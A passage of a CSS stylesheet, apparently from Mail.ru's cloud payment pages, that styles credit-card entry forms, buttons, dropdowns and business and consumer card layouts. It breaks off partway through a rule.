.pay-card-layout_type_standard_theme_black .credit-card-form__label-group_type_add-card .credit-card-form__input {
	display: none
}

.pay-card-layout_type_standard_theme_black [type=checkbox]+.credit-card-form__input-icon {
	display: inline-block;
	margin-right: 10px;
	vertical-align: top;
	width: 17px;
	height: 17px;
	border-radius: 4px;
	border: 1px solid rgba(245, 245, 247, .3);
	background: hsla(0, 0%, 85%, .06)
}

.pay-card-layout_type_standard_theme_black [type=checkbox]:hover+.credit-card-form__input-icon {
	border: 1px solid #119bdb;
	background: hsla(0, 0%, 85%, .06)
}

.pay-card-layout_type_standard_theme_black [type=checkbox]:checked+.credit-card-form__input-icon {
	background: #119bdb;
	border-color: #119bdb
}

.pay-card-layout_type_standard_theme_black [type=checkbox]:checked+.credit-card-form__input-icon:after {
	content: "";
	display: block;
	margin: auto;
	width: 4px;
	height: 12px;
	border: solid #fff;
	border-width: 0 2px 2px 0;
	-webkit-transform: rotate(45deg);
	-o-transform: rotate(45deg);
	transform: rotate(45deg)
}

.pay-card-layout_type_standard_theme_black .credit-card-form__label-group_type_add-card .credit-card-form__label {
	letter-spacing: .07px;
	color: #f5f5f7;
	font-size: 14px
}

.pay-card-layout_type_standard_theme_black .credit-card-form_size_x-small .credit-card-form__label-group_type_add-card {
	margin-top: 10px;
	margin-bottom: 0
}

.pay-card-layout_type_standard_theme_black .credit-card-form__popup,
.pay-card-layout_type_standard_theme_black .notification-block {
	background: #1a1d2a
}

.pay-card-layout_type_standard_theme_black .notification-block .title,
.pay-card-layout_type_standard_theme_black .paragraph,
.pay-card-layout_type_standard_theme_black .paragraph.paragraph_color_red {
	color: #f5f5f7;
	margin-top: 0
}

.pay-card-layout_type_standard_theme_black .notification-block .title {
	font-size: 22px;
	font-weight: 500;
	letter-spacing: .11px
}

.pay-card-layout_type_standard_theme_black .paragraph,
.pay-card-layout_type_standard_theme_black .paragraph.paragraph_color_red {
	font-size: 16px;
	line-height: 1.5;
	letter-spacing: .08px
}

.pay-card-layout_type_standard_theme_black .credit-card-form_size_x-small .payment-systems-icon_name_mir,
.pay-card-layout_type_standard_theme_black .credit-card-form_size_x-small .payment-systems-icon_name_visa {
	top: 2px
}

.pay-card-layout_type_standard_theme_black .notification-block .payment-info-table__cell,
.pay-card-layout_type_standard_theme_black .payment-info-table__caption,
.pay-card-layout_type_standard_theme_black .payment-info-table__head {
	color: rgba(245, 245, 247, .6)
}

select.control__select_type_standard_theme_black {
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none
}

.selectBox-dropdown-menu.control__select_type_standard_theme_black-selectBox-dropdown-menu {
	margin-top: 4px;
	border: 1px solid rgba(245, 245, 247, .2);
	background: #f5f5f7;
	border-radius: 3px
}

.selectBox-dropdown-menu.control__select_type_standard_theme_black-selectBox-dropdown-menu.selectBox-options li a {
	-webkit-font-smoothing: antialiased;
	font-family: Roboto, arial, helvetica;
	color: #1a1d2a;
	line-height: 2;
	padding: 0 6px 0 12px;
	font-size: 12px
}

.selectBox-dropdown-menu.control__select_type_standard_theme_black-selectBox-dropdown-menu.selectBox-options li.selectBox-hover {
	background: rgba(245, 245, 247, .6)
}

.selectBox-dropdown-menu.control__select_type_standard_theme_black-selectBox-dropdown-menu.selectBox-options li.selectBox-hover a {
	cursor: pointer
}

.selectBox-dropdown-menu.control__select_type_standard_theme_black-selectBox-dropdown-menu.selectBox-options li.selectBox-selected a {
	position: relative;
	color: #119bdb;
	background: none;
	cursor: default
}

.btn,
.pay-card_type_cloud .credit-card-form__submit .button {
	position: relative;
	display: inline-block;
	vertical-align: middle;
	line-height: 28px;
	margin: 0 12px 0 0;
	border: 1px solid;
	padding: 0 32px;
	cursor: pointer;
	font-size: 13px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	border-radius: 4px;
	-webkit-box-shadow: 0 1px 1px rgba(0, 0, 0, .1);
	box-shadow: 0 1px 1px rgba(0, 0, 0, .1);
	-webkit-user-select: none;
	-moz-user-select: none;
	user-select: none;
	outline: 0;
	overflow: visible
}

a.btn,
a.btn:active,
a.btn:focus,
a.btn:hover,
a.btn:link,
a.btn:visited {
	outline: 0;
	color: #333;
	text-decoration: none
}

.btn,
.pay-card_type_cloud .credit-card-form__submit .button {
	color: #333;
	text-shadow: none;
	border-color: hsla(0, 0%, 71%, .9);
	background-color: #f8f8f8;
	background-color: hsla(0, 0%, 100%, .03);
	background-image: -webkit-linear-gradient(left, hsla(0, 0%, 100%, .03), hsla(0, 0%, 100%, .03));
	background-image: -o-linear-gradient(left, hsla(0, 0%, 100%, .03) 0, hsla(0, 0%, 100%, .03) 100%);
	background-image: -webkit-gradient(linear, left top, right top, from(hsla(0, 0%, 100%, .03)), to(hsla(0, 0%, 100%, .03)));
	background-image: linear-gradient(90deg, hsla(0, 0%, 100%, .03) 0, hsla(0, 0%, 100%, .03))
}

.btn .ico {
	color: #333
}

.btn.btn_hover,
.btn:hover,
.pay-card_type_cloud .credit-card-form__submit .button:hover {
	color: #333;
	text-shadow: none;
	border-color: hsla(0, 0%, 71%, .9);
	background-color: #fbfbfb;
	background-color: hsla(0, 0%, 100%, .03);
	background-image: -webkit-linear-gradient(left, hsla(0, 0%, 100%, .03), hsla(0, 0%, 100%, .03));
	background-image: -o-linear-gradient(left, hsla(0, 0%, 100%, .03) 0, hsla(0, 0%, 100%, .03) 100%);
	background-image: -webkit-gradient(linear, left top, right top, from(hsla(0, 0%, 100%, .03)), to(hsla(0, 0%, 100%, .03)));
	background-image: linear-gradient(90deg, hsla(0, 0%, 100%, .03) 0, hsla(0, 0%, 100%, .03))
}

.btn.btn_hover .ico,
.btn:hover .ico {
	color: #333
}

.btn.btn_active,
.btn:active,
.pay-card_type_cloud .credit-card-form__submit .button:active {
	color: #333;
	text-shadow: none;
	border-color: hsla(0, 0%, 71%, .9);
	background-color: #f3f3f3;
	background-color: hsla(0, 0%, 100%, .03);
	background-image: -webkit-linear-gradient(left, hsla(0, 0%, 100%, .03), hsla(0, 0%, 100%, .03));
	background-image: -o-linear-gradient(left, hsla(0, 0%, 100%, .03) 0, hsla(0, 0%, 100%, .03) 100%);
	background-image: -webkit-gradient(linear, left top, right top, from(hsla(0, 0%, 100%, .03)), to(hsla(0, 0%, 100%, .03)));
	background-image: linear-gradient(90deg, hsla(0, 0%, 100%, .03) 0, hsla(0, 0%, 100%, .03))
}

.btn.btn_active .ico,
.btn:active .ico {
	color: #333
}

.btn.btn_loading,
.btn.btn_loading:active,
.btn.btn_loading:hover {
	cursor: progress;
	color: #333;
	text-shadow: none;
	border-color: hsla(0, 0%, 71%, .9);
	background-color: #f8f8f8;
	background-color: hsla(0, 0%, 100%, .03);
	background-image: -webkit-linear-gradient(left, hsla(0, 0%, 100%, .03), hsla(0, 0%, 100%, .03));
	background-image: -o-linear-gradient(left, hsla(0, 0%, 100%, .03) 0, hsla(0, 0%, 100%, .03) 100%);
	background-image: -webkit-gradient(linear, left top, right top, from(hsla(0, 0%, 100%, .03)), to(hsla(0, 0%, 100%, .03)));
	background-image: linear-gradient(90deg, hsla(0, 0%, 100%, .03) 0, hsla(0, 0%, 100%, .03))
}

.btn.btn_loading .ico,
.btn.btn_loading:active .ico,
.btn.btn_loading:hover .ico {
	color: #333
}

.btn.btn_disabled,
.btn.btn_disabled:active,
.btn.btn_disabled:hover,
.pay-card_type_cloud .credit-card-form__submit .button.button_disabled_yes,
.pay-card_type_cloud .credit-card-form__submit .button.button_disabled_yes:active,
.pay-card_type_cloud .credit-card-form__submit .button.button_disabled_yes:hover,
a.btn.btn_disabled,
a.btn.btn_disabled:active,
a.btn.btn_disabled:hover {
	cursor: default;
	color: rgba(51, 51, 51, .5);
	text-shadow: none;
	border-color: hsla(0, 0%, 71%, .9);
	background-color: #f8f8f8;
	background-color: hsla(0, 0%, 100%, .03);
	background-image: -webkit-linear-gradient(left, hsla(0, 0%, 100%, .03), hsla(0, 0%, 100%, .03));
	background-image: -o-linear-gradient(left, hsla(0, 0%, 100%, .03) 0, hsla(0, 0%, 100%, .03) 100%);
	background-image: -webkit-gradient(linear, left top, right top, from(hsla(0, 0%, 100%, .03)), to(hsla(0, 0%, 100%, .03)));
	background-image: linear-gradient(90deg, hsla(0, 0%, 100%, .03) 0, hsla(0, 0%, 100%, .03))
}

.btn.btn_disabled .ico,
.btn.btn_disabled:active .ico,
.btn.btn_disabled:hover .ico,
a.btn.btn_disabled .ico,
a.btn.btn_disabled:active .ico,
a.btn.btn_disabled:hover .ico {
	color: rgba(51, 51, 51, .5)
}

.btn__text+.ico,
.ico+.btn__text {
	margin-left: 8px
}

.btn__tooltip {
	display: none;
	opacity: 0;
	position: absolute;
	top: -39px;
	left: 100%;
	margin-left: -50%;
	padding-bottom: 9px;
	border-radius: 2px
}

.btn__tooltip:before {
	content: "";
	position: absolute;
	bottom: 4px;
	left: 0;
	margin-left: -5px;
	width: 0;
	height: 0;
	border-style: solid;
	border-width: 5px 5px 0;
	border-color: rgba(0, 0, 0, .7) transparent transparent
}

.btn__tooltip__text {
	position: relative;
	left: -50%;
	padding: 0 20px;
	background-color: rgba(0, 0, 0, .7);
	font-size: 12px;
	line-height: 30px;
	white-space: nowrap;
	color: #fff;
	text-shadow: 0 -1px rgba(0, 0, 0, .3);
	border-radius: 2px
}

.btn.btn_hover .btn__tooltip,
.btn:hover .btn__tooltip {
	display: block;
	-webkit-animation: btn__tooltip_fade-in .2s ease-in .5s forwards;
	-o-animation: btn__tooltip_fade-in .2s ease-in .5s forwards;
	animation: btn__tooltip_fade-in .2s ease-in .5s forwards
}

.btn_main,
.pay-card_type_cloud .credit-card-form__submit .button {
	color: #fff;
	text-shadow: 0 -1px rgba(0, 0, 0, .3);
	border-color: #37628f;
	background-color: #2a629c;
	background-image: -webkit-linear-gradient(top, transparent, transparent), none;
	background-image: -o-linear-gradient(top, transparent, transparent), none;
	background-image: -webkit-gradient(linear, left top, left bottom, from(transparent), to(transparent)), none;
	background-image: linear-gradient(180deg, transparent, transparent), none
}

.btn_main .ico {
	color: #fff
}

.btn_main.btn_hover,
.btn_main:hover,
.pay-card_type_cloud .credit-card-form__submit .button:hover {
	color: #fff;
	text-shadow: 0 -1px rgba(0, 0, 0, .3);
	border-color: #37628f;
	background-color: #3f79b5;
	background-image: -webkit-linear-gradient(top, transparent, transparent), none;
	background-image: -o-linear-gradient(top, transparent, transparent), none;
	background-image: -webkit-gradient(linear, left top, left bottom, from(transparent), to(transparent)), none;
	background-image: linear-gradient(180deg, transparent, transparent), none
}

.btn_main.btn_hover .ico,
.btn_main:hover .ico {
	color: #fff
}

.btn_main.btn_active,
.btn_main:active,
.pay-card_type_cloud .credit-card-form__submit .button:active {
	color: #fff;
	text-shadow: 0 -1px rgba(0, 0, 0, .3);
	border-color: #37628f;
	background-color: #285d94;
	background-image: -webkit-linear-gradient(top, transparent, transparent), none;
	background-image: -o-linear-gradient(top, transparent, transparent), none;
	background-image: -webkit-gradient(linear, left top, left bottom, from(transparent), to(transparent)), none;
	background-image: linear-gradient(180deg, transparent, transparent), none
}

.btn_main.btn_active .ico,
.btn_main:active .ico {
	color: #fff
}

.btn_main.btn_loading,
.btn_main.btn_loading:active,
.btn_main.btn_loading:hover {
	cursor: progress;
	color: #fff;
	text-shadow: 0 -1px rgba(0, 0, 0, .3);
	border-color: #37628f;
	background-color: #2a629c;
	background-image: -webkit-linear-gradient(top, transparent, transparent), url("https://img.imgsmail.ru/common/toolkit/btn/_loading/btn_loading.png");
	background-image: -o-linear-gradient(top, transparent, transparent), url("https://img.imgsmail.ru/common/toolkit/btn/_loading/btn_loading.png");
	background-image: -webkit-gradient(linear, left top, left bottom, from(transparent), to(transparent)), url("https://img.imgsmail.ru/common/toolkit/btn/_loading/btn_loading.png");
	background-image: linear-gradient(180deg, transparent, transparent), url("https://img.imgsmail.ru/common/toolkit/btn/_loading/btn_loading.png")
}

.btn_main.btn_loading .ico,
.btn_main.btn_loading:active .ico,
.btn_main.btn_loading:hover .ico {
	color: #fff
}

.btn_main.btn_disabled,
.btn_main.btn_disabled:active,
.btn_main.btn_disabled:hover,
.pay-card_type_cloud .credit-card-form__submit .button.button_disabled_yes,
.pay-card_type_cloud .credit-card-form__submit .button.button_disabled_yes:active,
.pay-card_type_cloud .credit-card-form__submit .button.button_disabled_yes:hover {
	cursor: default;
	color: hsla(0, 0%, 100%, .5);
	text-shadow: 0 -1px rgba(0, 0, 0, .3);
	border-color: #37628f;
	background-color: #2a629c;
	background-image: -webkit-linear-gradient(top, transparent, transparent), none;
	background-image: -o-linear-gradient(top, transparent, transparent), none;
	background-image: -webkit-gradient(linear, left top, left bottom, from(transparent), to(transparent)), none;
	background-image: linear-gradient(180deg, transparent, transparent), none
}

.btn_main.btn_disabled .ico,
.btn_main.btn_disabled:active .ico,
.btn_main.btn_disabled:hover .ico {
	color: hsla(0, 0%, 100%, .5)
}

a.btn_main,
a.btn_main:active,
a.btn_main:focus,
a.btn_main:hover,
a.btn_main:link,
a.btn_main:visited {
	color: #fff
}

.btn.btn_grouped {
	margin-right: 0;
	border-left-width: 0;
	border-radius: 0
}

.btn.btn_grouped_first {
	border-left-width: 1px;
	border-radius: 4px 0 0 4px
}

.btn.btn_grouped_last {
	margin-right: 12px;
	border-radius: 0 4px 4px 0
}

.btn_float_left {
	float: left
}

.btn_float_right {
	float: right
}

.btn_layer_close,
.btn_layer_close:active,
.btn_layer_close:hover {
	position: absolute;
	right: -16px;
	top: 0;
	border: none;
	background: transparent;
	-webkit-box-shadow: none;
	box-shadow: none;
	z-index: 1
}

.btn_layer_close:hover .ico {
	color: #f46c00
}

.btn_invert {
	color: #f8f8f8;
	background-color: #333;
	border-color: #000;
	-webkit-box-shadow: 0 1px 1px hsla(0, 0%, 100%, .1);
	box-shadow: 0 1px 1px hsla(0, 0%, 100%, .1)
}

.btn_invert.btn_hover,
.btn_invert:hover {
	color: #fbfbfb;
	background-color: #4a4a4a;
	border-color: #000
}

.btn.btn_invert.btn_disabled {
	color: #666;
	background-color: #1c1c1c;
	border-color: #000
}

.btn__group {
	-webkit-box-shadow: 0 1px 0 1px rgba(0, 0, 0, .1);
	box-shadow: 0 1px 0 1px rgba(0, 0, 0, .1);
	border-radius: 4px;
	display: inline-block;
	line-height: 1
}

.btn__group .btn_active {
	background-color: #e0e0e0
}

.btn,
.pay-card_type_cloud .credit-card-form__submit .button {
	border-radius: 2px
}

.btn_main,
.pay-card_type_cloud .credit-card-form__submit .button {
	border-color: #07c;
	background-color: #168de2
}

.btn_main.btn_hover,
.btn_main:hover,
.pay-card_type_cloud .credit-card-form__submit .button:hover {
	border-color: #07c;
	background-color: #147fc0
}

.btn_main.btn_active,
.btn_main:active,
.pay-card_type_cloud .credit-card-form__submit .button:active {
	border-color: #1175b2;
	background-color: #1175b2
}

.btn_main.btn_disabled,
.btn_main.btn_disabled:active,
.btn_main.btn_disabled:hover,
.pay-card_type_cloud .credit-card-form__submit .button.button_disabled_yes,
.pay-card_type_cloud .credit-card-form__submit .button.button_disabled_yes:active,
.pay-card_type_cloud .credit-card-form__submit .button.button_disabled_yes:hover {
	opacity: .4
}

.b-layer__controls__buttons {
	height: 30px
}

@-webkit-keyframes btn {
	0% {
		background-position: 0 0, 0 0
	}
	to {
		background-position: 0 0, 24px 0
	}
}

@-o-keyframes btn {
	0% {
		background-position: 0 0, 0 0
	}
	to {
		background-position: 0 0, 24px 0
	}
}

@keyframes btn {
	0% {
		background-position: 0 0, 0 0
	}
	to {
		background-position: 0 0, 24px 0
	}
}

@-webkit-keyframes btn__tooltip_fade-in {
	to {
		opacity: 1
	}
}

@-o-keyframes btn__tooltip_fade-in {
	to {
		opacity: 1
	}
}

@keyframes btn__tooltip_fade-in {
	to {
		opacity: 1
	}
}

.pay-card_type_cloud .pay-card__card-selector {
	margin-bottom: 30px
}

.pay-card_type_cloud .credit-card-form {
	background-color: #fff
}

.pay-card_type_cloud .credit-card-form__terms {
	padding-top: 25px
}

.pay-card_type_cloud .credit-card-form__terms-link {
	color: #07c;
	text-decoration: none
}

.pay-card_type_cloud .credit-card-form__submit .button {
	font: inherit;
	text-transform: inherit;
	height: 30px;
	margin-right: 40%
}

.pay-card-layout_type_cloud .credit-card-form__submit .button {
	font-family: Roboto, Arial, sans-serif
}

.pay-card-layout_type_cloud-b2b .credit-card-form__card-wrapper,
.pay-card-layout_type_cloud-b2b .credit-card-form__submit-inner,
.pay-card-layout_type_cloud-b2b .credit-card-form__terms,
.pay-card-layout_type_cloud-b2b .pay-card-layout__notification {
	width: 410px;
	margin: 0 auto;
	padding-left: 20px;
	padding-right: 20px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

.pay-card-layout_type_cloud-b2b .credit-card-form {
	padding-bottom: 0
}

.pay-card-layout_type_cloud-b2b .credit-card-form__card-wrapper {
	margin-bottom: 25px
}

.pay-card-layout_type_cloud-b2b .pay-card-layout__title {
	margin-bottom: 10px
}

.pay-card-layout_type_cloud-b2b .info-block_type_error,
.pay-card-layout_type_cloud-b2b .pay-card-layout__title {
	text-align: left;
	font-size: 15px;
	line-height: 20px
}

.pay-card-layout_type_cloud-b2b .pay-card__card {
	position: relative;
	width: auto
}

.pay-card-layout_type_cloud-b2b .info-block_type_error {
	display: none;
	color: #f10
}

.pay-card-layout_type_cloud-b2b .info-block .paragraph {
	margin: 0
}

.pay-card-layout_type_cloud-b2b .pay-card-layout__notification {
	margin: 0 auto
}

.pay-card-layout_type_cloud-b2b .secure-information {
	padding-top: 10px;
	background: none
}

.pay-card-layout_type_cloud-b2b-outgoing .secure-information {
	padding-bottom: 20px
}

.pay-card-layout_type_cloud-b2b .secure-information__icon {
	display: none
}

.pay-card-layout_type_cloud-b2b .secure-information__column_position_left,
.pay-card-layout_type_cloud-b2b .secure-information__column_position_right {
	padding: 0
}

.pay-card-layout_type_cloud-b2b .protection-icons__list-item {
	margin-right: 0
}

.pay-card-layout_type_cloud-b2b .secure-information__text {
	font-size: 13px;
	line-height: 17px;
	color: #999
}

.pay-card-layout_type_cloud-b2b .secure-information__text_type_protocol {
	display: block;
	color: #10b800
}

.pay-card_type_cloud-b2b {
	min-height: 320px
}

.pay-card_type_cloud-b2b .pay-card__card-selector,
.pay-card_type_cloud-b2b .pay-card__remove-card,
.pay-card_type_cloud-b2b .pay-card__title {
	display: none!important
}

.pay-card_type_cloud-b2b .credit-card-form__form {
	padding: 0
}

.pay-card_type_cloud-b2b .credit-card-form__card_position_back,
.pay-card_type_cloud-b2b .credit-card-form__card_position_front {
	width: 274px;
	height: 181px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	border-radius: 8px
}

.pay-card_type_cloud-b2b .credit-card-form__card_position_front {
	padding-top: 50px;
	background: #f0f0f0;
	-webkit-box-shadow: 2px 0 0 0 rgba(0, 0, 0, .04);
	box-shadow: 2px 0 0 0 rgba(0, 0, 0, .04)
}

.pay-card_type_cloud-b2b .credit-card-form__card_position_back {
	margin-top: -181px;
	right: -106px;
	background: #c7c7c7;
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card_type_cloud-b2b .credit-card-form__card_position_back:before {
	height: 35px
}

.pay-card_type_cloud-b2b .payment-systems-icons {
	top: -35px
}

.pay-card_type_cloud-b2b .credit-card-form__submit {
	margin-top: 0;
	text-align: left;
	border-top: 1px solid #e0e0e0;
	padding: 25px 0 10px
}

.pay-card_type_cloud-b2b .credit-card-form__title {
	text-transform: none;
	font-size: 13px;
	font-weight: 700;
	line-height: 14px
}

.pay-card_type_cloud-b2b .credit-card-form__title_type_expiration-date {
	top: 135px
}

.pay-card_type_cloud-b2b .credit-card-form__label_type_cvv .credit-card-form__title {
	margin-top: 5px;
	margin-bottom: 5px
}

.pay-card_type_cloud-b2b .credit-card-form__error-text,
.pay-card_type_cloud-b2b .credit-card-form__label_type_cvv .credit-card-form__error-text {
	position: static;
	display: none;
	font-size: 13px
}

.pay-card_type_cloud-b2b .credit-card-form__label_error_yes .credit-card-form__input {
	outline: 0;
	border: 1px solid #f10
}

.pay-card_type_cloud-b2b .credit-card-form__input {
	padding-top: 6px;
	padding-bottom: 6px;
	border: 1px solid rgba(0, 0, 0, .12);
	border-radius: 2px;
	background: #fff;
	font-size: 15px;
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none
}

.pay-card_type_cloud-b2b .credit-card-form__input:disabled {
	background: #f0f0f0;
	border-color: #f0f0f0;
	color: #000;
	opacity: 1;
	-webkit-text-fill-color: #000
}

.pay-card_type_cloud-b2b .credit-card-form__label-group_type_card-number .credit-card-form__input {
	letter-spacing: .1em
}

.pay-card_type_cloud-b2b .credit-card-form__terms {
	padding-top: 10px;
	font-size: 13px;
	line-height: 18px;
	color: #999
}

.pay-card_type_cloud-b2b .credit-card-form__terms-link {
	color: #999
}

.pay-card_type_cloud-b2b .credit-card-form__terms-link:hover {
	text-decoration: none
}

.pay-card_type_cloud-b2b .credit-card-form__label-group_type_holder-name {
	display: inline-block;
	width: 160px
}

.pay-card_type_cloud-b2b .credit-card-form__label-group_type_holder-name .credit-card-form__title {
	margin: 0 0 3px
}

.pay-card_type_cloud-b2b .credit-card-form__cvv-icon,
.pay-card_type_cloud-b2b .credit-card-form__label:hover .credit-card-form__cvv-icon {
	width: 16px;
	height: 16px
}

.pay-card_type_cloud-b2b .credit-card-form__cvv-icon {
	display: block;
	margin-top: 6px;
	background: #333;
	border-radius: 8px;
	text-align: center;
	cursor: pointer
}

.pay-card_type_cloud-b2b .credit-card-form__cvv-icon:before {
	display: block;
	content: "?";
	font-size: 9px;
	color: #c7c7c7;
	line-height: 16px
}

.pay-card_type_cloud-b2b .credit-card-form__tooltip_type_cvv {
	left: 50%;
	margin-left: -90px;
	padding-right: 15px;
	padding-left: 15px;
	border-radius: 2px;
	-webkit-box-shadow: 0 4px 16px 2px rgba(0, 0, 0, .12);
	box-shadow: 0 4px 16px 2px rgba(0, 0, 0, .12);
	font-size: 15px;
	line-height: 18px;
	color: #333
}

.pay-card_type_cloud-b2b .credit-card-form__tooltip_type_cvv .credit-card-form__tooltip-arrow,
.pay-card_type_cloud-b2b .credit-card-form__tooltip_type_cvv .credit-card-form__tooltip-icon,
.pay-card_type_cloud-b2b .pay-card__card_type_added-card .payment-systems-icon.payment-systems-icon_disabled_yes {
	display: none
}

.pay-card-layout_type_cloud-b2b .credit-card-form__popup .button,
.pay-card_type_cloud-b2b .credit-card-form__submit .button {
	color: #fff;
	background: #2469f5;
	border: 1px solid rgba(0, 0, 0, .12);
	margin: 0;
	font-size: 15px;
	text-transform: none;
	padding: 0 15px;
	font-weight: 500
}

.pay-card-layout_type_cloud-b2b .credit-card-form__popup .button:hover,
.pay-card_type_cloud-b2b .credit-card-form__submit .button:hover {
	background: #2365eb
}

.pay-card-layout_type_cloud-b2b .credit-card-form__popup .button:active,
.pay-card_type_cloud-b2b .credit-card-form__submit .button:active {
	background: #2161e1
}

.pay-card-layout_type_cloud-b2b .credit-card-form__popup .button.button_disabled_yes,
.pay-card-layout_type_cloud-b2b .credit-card-form__popup .button.button_disabled_yes:active,
.pay-card-layout_type_cloud-b2b .credit-card-form__popup .button.button_disabled_yes:hover,
.pay-card_type_cloud-b2b .credit-card-form__submit .button.button_disabled_yes,
.pay-card_type_cloud-b2b .credit-card-form__submit .button.button_disabled_yes:active,
.pay-card_type_cloud-b2b .credit-card-form__submit .button.button_disabled_yes:hover {
	background: #2469f5;
	border: 1px solid rgba(0, 0, 0, .12);
	color: #fff;
	cursor: default;
	opacity: .4
}

.pay-card-layout_type_cloud-b2b .credit-card-form__popup .button__light,
.pay-card_type_cloud-b2b .credit-card-form__submit .button__light {
	color: #333;
	border: 1px solid;
	border-color: rgba(0, 0, 0, .12);
	border-radius: 2px;
	-webkit-box-shadow: 0 2px 0 0 rgba(0, 0, 0, .04);
	box-shadow: 0 2px 0 0 rgba(0, 0, 0, .04);
	background: #f0f0f0;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

.pay-card-layout_type_cloud-b2b .credit-card-form__popup .button__light:hover,
.pay-card_type_cloud-b2b .credit-card-form__submit .button__light:hover {
	border: 1px solid;
	border-color: rgba(0, 0, 0, .12);
	-webkit-box-shadow: 0 2px 0 0 rgba(0, 0, 0, .04);
	box-shadow: 0 2px 0 0 rgba(0, 0, 0, .04);
	background: #ddd
}

.pay-card-layout_type_cloud-b2b .credit-card-form__popup .button__light:active,
.pay-card_type_cloud-b2b .credit-card-form__submit .button__light:active {
	-webkit-box-shadow: inset 0 2px 0 0 rgba(0, 0, 0, .04);
	box-shadow: inset 0 2px 0 0 rgba(0, 0, 0, .04);
	background: #d3d3d3
}

.pay-card-layout_type_cloud-b2b .credit-card-form__popup .button__light.button_disabled_yes,
.pay-card_type_cloud-b2b .credit-card-form__submit .button__light.button_disabled_yes {
	border-radius: 2px
}

.pay-card-layout_type_cloud-b2b .credit-card-form__popup .button__light.button_disabled_yes,
.pay-card-layout_type_cloud-b2b .credit-card-form__popup .button__light.button_disabled_yes:active,
.pay-card-layout_type_cloud-b2b .credit-card-form__popup .button__light.button_disabled_yes:hover,
.pay-card_type_cloud-b2b .credit-card-form__submit .button__light.button_disabled_yes,
.pay-card_type_cloud-b2b .credit-card-form__submit .button__light.button_disabled_yes:active,
.pay-card_type_cloud-b2b .credit-card-form__submit .button__light.button_disabled_yes:hover {
	-webkit-box-shadow: 0 2px 0 0 rgba(0, 0, 0, .04);
	box-shadow: 0 2px 0 0 rgba(0, 0, 0, .04);
	background: #f0f0f0;
	color: #333;
	cursor: default;
	opacity: .48
}

.pay-card-layout_type_cloud-b2b .credit-card-form__popup .button,
.pay-card-layout_type_cloud-b2b .credit-card-form__popup .button__light,
.pay-card_type_cloud-b2b .credit-card-form__submit .button,
.pay-card_type_cloud-b2b .credit-card-form__submit .button__light {
	padding-left: 20px;
	padding-right: 20px;
	font-size: 15px;
	font-weight: 400;
	-webkit-font-smoothing: antialiased
}

.pay-card_type_cloud-b2b .credit-card-form__submit .button {
	margin-right: 10px
}

.pay-card-layout_type_cloud-b2b .credit-card-form__popup .info-block .title {
	margin: 0 0 25px;
	font-size: 24px;
	line-height: 32px
}

.pay-card-layout_type_cloud-b2b .credit-card-form__popup .info-block .paragraph {
	font-size: 15px;
	line-height: 20px
}

.pay-card-layout_type_cloud-b2b .credit-card-form__popup .info-block .payment-info-table {
	padding: 0
}

.pay-card-layout_type_cloud-b2b .credit-card-form__popup .info-block .payment-info-table__caption {
	padding: 15px 0 10px
}

.pay-card-layout_type_cloud-b2b .credit-card-form__popup-body {
	height: 100%
}

.pay-card-layout_type_cloud-b2b .credit-card-form__popup-footer {
	margin-bottom: 20px;
	height: auto;
	position: absolute;
	bottom: 0;
	left: 50%;
	-webkit-transform: translateX(-50%);
	-o-transform: translateX(-50%);
	transform: translateX(-50%)
}

.pay-card-layout_type_cloud-b2b .credit-card-form__submit .button {
	font-family: Roboto, Arial, sans-serif
}

.pay-card-layout_type_cloud-b2c .credit-card-form__card-wrapper,
.pay-card-layout_type_cloud-b2c .credit-card-form__description,
.pay-card-layout_type_cloud-b2c .credit-card-form__label-group_type_payment-amount,
.pay-card-layout_type_cloud-b2c .credit-card-form__submit-inner,
.pay-card-layout_type_cloud-b2c .credit-card-form__terms,
.pay-card-layout_type_cloud-b2c .pay-card-layout__notification,
.pay-card-layout_type_cloud-b2c .pay-card-layout__title,
.pay-card-layout_type_cloud-b2c .pay-card__card-selector {
	width: 420px;
	margin: 0;
	padding-left: 20px;
	padding-right: 20px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

.pay-card-layout_type_cloud-b2c .pay-card__row {
	padding-top: 0
}

.pay-card-layout_type_cloud-b2c .credit-card-form {
	padding-bottom: 0
}

.pay-card-layout_type_cloud-b2c .credit-card-form__card-wrapper {
	margin-bottom: 25px
}

.pay-card-layout_type_cloud-b2c .credit-card-form__description,
.pay-card-layout_type_cloud-b2c .pay-card-layout__title {
	margin-bottom: 20px
}

.pay-card-layout_type_cloud-b2c .credit-card-form__description,
.pay-card-layout_type_cloud-b2c .info-block_type_error,
.pay-card-layout_type_cloud-b2c .pay-card-layout__title {
	text-align: left;
	font-size: 15px;
	line-height: 20px
}

.pay-card-layout_type_cloud-b2c .pay-card__card {
	position: relative;
	width: auto
}

.pay-card-layout_type_cloud-b2c .info-block_type_error {
	display: none;
	color: #f10;
	padding-bottom: 10px
}

.pay-card-layout_type_cloud-b2c .info-block .paragraph {
	margin: 0
}

.pay-card_type_cloud-b2c .pay-card__card-selector {
	text-align: center;
	margin-bottom: 10px
}

.pay-card_type_cloud-b2c .pay-card__card-selector.pay-card__card-selector_type_hidden {
	display: none!important
}

.pay-card_type_cloud-b2c .control__select {
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none
}

.pay-card_type_cloud-b2c .pay-card__card-selector .selectBox-label {
	font-size: 15px;
	padding-right: 15px
}

.pay-card_type_cloud-b2c .pay-card__card-selector .control-label__text,
.pay-card_type_cloud-b2c .pay-card__remove-card-icon {
	display: none
}

.pay-card_type_cloud-b2c .pay-card__remove-card-text {
	font-size: 15px;
	text-decoration: underline
}

.pay-card_type_cloud-b2c .pay-card__remove-card-text:hover {
	text-decoration: none
}

.pay-card_type_cloud-b2c .credit-card-form__form {
	padding: 0
}

.pay-card_type_cloud-b2c .credit-card-form__card_position_back,
.pay-card_type_cloud-b2c .credit-card-form__card_position_front {
	width: 274px;
	height: 181px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	border-radius: 8px
}

.pay-card_type_cloud-b2c .credit-card-form__card_position_front {
	padding-top: 50px;
